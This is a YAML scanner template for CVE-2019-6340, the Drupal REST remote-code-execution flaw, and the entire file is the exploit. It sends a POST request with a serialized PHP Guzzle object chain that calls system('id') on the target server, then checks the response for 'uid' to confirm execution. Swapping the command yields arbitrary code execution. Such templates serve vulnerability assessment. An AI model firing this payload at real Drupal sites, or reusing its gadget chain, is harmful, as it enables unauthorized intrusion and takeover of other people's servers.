name: poc-yaml-cve-2019-6340
set:
  r1: parseURL(url)['host']
rules:
  - method: POST
    path: /node/?_format=hal_json
    headers:
      User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0)'
      Content-Type: application/hal+json
      Accept: '*/*'
    body: "{\n\t\"link\": [{\n\t\t\"value\": \"link\",\n\t\t\"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:2:\\\"id\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\n\t}],\n\t\"_links\": {\n\t\t\"type\": {\n\t\t\t\"href\": \"http://{{r1}}/rest/type/shortcut/default\"\n\t\t}\n\t}\n}"
    follow_redirects: true
    expression: |
      status==403&&body.bcontains(b'uid')
detail:
  author: thatqier
  links:
    - https://github.com/jas502n/CVE-2019-6340
    - https://github.com/knqyf263/CVE-2019-6340